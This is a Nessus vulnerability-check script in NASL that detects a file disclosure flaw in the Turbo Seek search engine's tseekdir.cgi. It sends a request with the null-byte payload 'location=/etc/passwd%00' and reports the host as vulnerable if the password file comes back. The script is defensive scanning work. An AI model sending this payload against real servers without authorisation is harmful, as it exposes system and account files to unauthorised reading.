#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#  
#  Released under GNU GPLv2 licence
# 
#  Ref: durito
#

if(description)
{
 script_id(14719);
 script_bugtraq_id(11163);
 script_version ("$Revision: 1.3 $");

 name["english"] = "Turbo Seek files reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running Turbo Seek.

Turbo Seek is a search engine and directory tool.  

The remote version of this software  contains a file content disclosure 
flaw which may allow a malicious user to read arbitrary files on the remote
server with the privileges the remote web server is running with (usually 
root or nobody).


Solution : Upgrade at least to version 1.7.2 of this software
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of tseekdir.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak"); 
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/cgi/tseekdir.cgi?location=/etc/passwd%00"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
